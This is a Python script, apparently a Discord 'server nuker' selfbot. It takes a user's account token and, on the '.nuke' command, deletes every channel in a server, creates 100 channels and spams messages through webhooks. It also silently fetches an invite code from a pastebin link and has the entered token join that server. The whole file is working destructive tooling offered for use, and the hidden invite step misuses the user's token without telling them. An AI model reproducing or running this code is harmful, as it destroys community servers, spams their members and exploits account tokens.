import sys, time, threading

def print015(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
    sys.stdout.write("\n")

def print01(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)


try:
    import colorama, requests, discord
    from discord.ext import commands
except:
    sys.stdout.write("> ")
    print015("Missing Required Modules, Press Enter To Download (May Not Always Work)")
    input("")
    import os
    try:
        os.system("pip install colorama requests discord==1.7.3")
    except:
        pass
    sys.stdout.write("> ")
    print015("Problem Maybe Fixed Now, Restart The Program")
    input("")
    exit()

colorama.init(autoreset=True)

try:
    import os
    from os import system
    system("title " + "Discord Server Nuker,   Made By blob#0005,   Github: github.com/blob0005")
except:
    pass


sys.stdout.write(colorama.Fore.CYAN + "> ")
print01("Version 1.7.3 Is The Required Version Of Discord.py, Press Enter To Start The Main Program")
input("")



invite_code = str(requests.get("https://pastebin.com/raw/9SxbfxE8").text)
while True:
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print01("Enter Token: ")
    tokens = input("")
    r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": tokens})
    if "200" not in str(r1):
        sys.stdout.write(colorama.Fore.RED + "> ")
        print015("Invalid Token")
    if "200" in str(r1):
        r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": tokens})
        if "200" in str(r):
            break
        if "403" in str(r):
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Locked Token")
headers = {"authorization": tokens}

prefix = "."

sys.stdout.write(colorama.Fore.CYAN + "> ")
print01("Channel Names: ")
name = input("")
sys.stdout.write(colorama.Fore.CYAN + "> ")
print01("What To Send In All Channels: ")
msg = input("")


import random
lest = []

def lil():
    global lest
    while True:
        for u in lest:
            lest.remove(u)
            if "Error" in u:
                sys.stdout.write(colorama.Fore.RED + "> ")
            else:
                sys.stdout.write(colorama.Fore.CYAN + "> ")
            print(u)
        time.sleep(0.001)
threading.Thread(target=lil).start()
###
def err(web):
    global lest
    for u in range(100):
        while True:
            try:
                re = requests.post(web, json={"content": msg, "username": "nuked "+str(random.randint(1,10000))})
                if "204" in str(re) or "200" in str(re) or "201" in str(re):
                    lest.append("Sent Message To Webhook")
                    break
                else:
                    lest.append("Unkown Error / Rate Limtied")
            except:
                pass

def spam(channel):
    webs = []
    global lest
    try:
        for u in range(2):
            js = requests.post(f"https://discord.com/api/v9/channels/{str(channel)}/webhooks", headers=headers, json={"name": "nuked"}).json()
            channel = js["id"]
            token = js["token"]
            lest.append("Created Webhook")
            we = f"https://discord.com/api/webhooks/{str(channel)}/{str(token)}"
            threading.Thread(target=err, args=(we,)).start()
    except Exception as errr:
        pass
###


def create():
    try:
        re = requests.post(f"https://discord.com/api/v9/guilds/{str(guild)}/channels", headers=headers, json={"type": 0, "name": name, "permission_overwrites": []}).json()
        id = str(re["id"])
        global lest
        lest.append("Created Channel")
        threading.Thread(target=spam, args=(id,)).start()
    except: pass


def delete(id):
    try:
        while True:
            re = requests.delete("https://discord.com/api/v9/channels/"+str(id), headers=headers)
            if "200" in str(re):
                global lest
                lest.append("Deleted Channel")
                break
    except:
        pass

#Bot Code
sys.stdout.write(colorama.Fore.CYAN + "> ")
print("Starting Selfbot...")
colorama.init(autoreset=True)
bot = commands.Bot(command_prefix=prefix, self_bot=True)



@bot.event
async def on_command_error(ctx, error):
    pass

@bot.event
async def on_ready():
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print015("Type .nuke In The Server You Wanna Nuke (Need Admin)")



@bot.command()
async def nuke(ctx):
    global lest
    global guild
    guild = str(ctx.guild.id)
    for channel in ctx.guild.channels:
        e = channel.id
        threading.Thread(target=delete, args=(str(e),)).start()
        lest.append("Scraped Channel")
    for u in range(100):
        threading.Thread(target=create).start()
    

bot.run(tokens, bot=False)
